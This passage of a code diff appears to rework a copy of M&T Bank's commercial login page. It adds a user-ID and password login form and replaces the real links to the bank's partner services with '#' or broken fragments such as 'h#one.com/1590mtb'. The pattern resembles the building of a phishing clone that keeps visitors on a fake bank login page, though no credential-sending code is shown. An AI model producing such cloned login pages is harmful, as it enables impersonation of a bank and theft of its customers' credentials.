+						<input type="checkbox" id="commercial-login-checkbox" name="remember-me" class="login-remember-me" aria-label="Remember User ID">
+						<label for="commercial-login-checkbox" class="login-checkbox-label" aria-hidden="true">Remember User ID</label>
+					</div>
+					<div class="login-item -login-user-only">
+						<a class="login-link" data-speedbump-enabled="false" href="#">
+							<svg class="login-icon -icon-question-mark">
+								<use xlink:href="#icon-question-mark"></use>
+							</svg>
+							Forgot Password
+						</a>
+					</div>
+				</div>
+				<div class="login-split -cta-buttons">
+					<div class="login-item login-button">
+						<div class="submit-button">
+							<button type="submit" class="submit-action">
+								<span>Log In<span aria-hidden="true"> &gt;</span></span>
+							</button>
+						</div>
+					</div>
+					<div class="login-item -go-home">
+						
+
+    <div class="cta-button component -full-width style-hyperlink 14  ">
+        <a class="cta-button-link" target="_self" data-speedbump-enabled="false" href="#" aria-label="Visit homepage" data-id="1510240598" data-comp-type="cta-button" data-tag-type="off">
+            <span class="button-text -text-wrap -chevron">Go to M&amp;T Bank Website</span>
+        </a>
+    </div>
+
+
+					</div>
+				</div>
+			</fieldset>
+		</form>
 		<div class="privacy-block">
 			<div class="privacy-link -privacy">
 				<svg class="login-icon -icon-lock">
@@ -1326,7 +1827,7 @@ min-height:35%;
 							</li>
 						
 							<li class="dropdown-menu-item">
-								<a href="https://myaccountviewonline.com/" data-speedbump-enabled="false" class="dropdown-menu-link">Account View</a>
+								<a href="#" data-speedbump-enabled="false" class="dropdown-menu-link">Account View</a>
 							</li>
 						
 							<li class="dropdown-menu-item">
@@ -1344,19 +1845,19 @@ min-height:35%;
 						</li>
 						
 							<li class="dropdown-menu-item">
-								<a href="https://weborders.brinksinc.com" data-speedbump-enabled="false" class="dropdown-menu-link">Cash Order</a>
+								<a href="#nksinc.com" data-speedbump-enabled="false" class="dropdown-menu-link">Cash Order</a>
 							</li>
 						
 							<li class="dropdown-menu-item">
-								<a href="https://www.centresuite.com/Centre/Public/Logon/Index?ReturnUrl=%2fCentre%3fsite%3d2129&amp;site=2129" data-speedbump-enabled="false" class="dropdown-menu-link">CentreSuite</a>
+								<a href="#turnUrl=%2fCentre%3fsite%3d2129&amp;site=2129" data-speedbump-enabled="false" class="dropdown-menu-link">CentreSuite</a>
 							</li>
 						
 							<li class="dropdown-menu-item">
-								<a href="https://www.youraccessone.com/1590mtb" data-speedbump-enabled="false" class="dropdown-menu-link">AccessOne</a>
+								<a href="h#one.com/1590mtb" data-speedbump-enabled="false" class="dropdown-menu-link">AccessOne</a>
 							</li>
 						
 							<li class="dropdown-menu-item">
-								<a href="https://www.mtbsupplierpay.com/UserLogin/UserLogin.do?ino=mtb" data-speedbump-enabled="false" class="dropdown-menu-link">M&amp;T Supplier Pay</a>
+								<a href="#Login/UserLogin.do?ino=mtb" data-speedbump-enabled="false" class="dropdown-menu-link">M&amp;T Supplier Pay</a>
 							</li>
 						
 							<li class="dropdown-menu-item">
@@ -1366,7 +1867,7 @@ min-height:35%;
 					</ul>
 				</div>
 			</div>
-			<a href="https://mtb.com/olb-enroll" class="login-link -sign-up -larger" data-personal-business="true" data-personal-business-title="Enroll Now" data-personal-business-url="https://mtb.com/olb-enroll" data-commercial="false" data-commercial-title="Sign Up" data-speedbump-enabled="false">Enroll Now</a>
+			<a href="https://mtb.com/olb-enroll" class="login-link -sign-up -larger" data-personal-business="true" data-personal-business-title="Enroll Now" data-personal-business-url="#" data-commercial="false" data-commercial-title="Sign Up" data-speedbump-enabled="false">Enroll Now</a>
 		</div>
 	</div>
 </div>
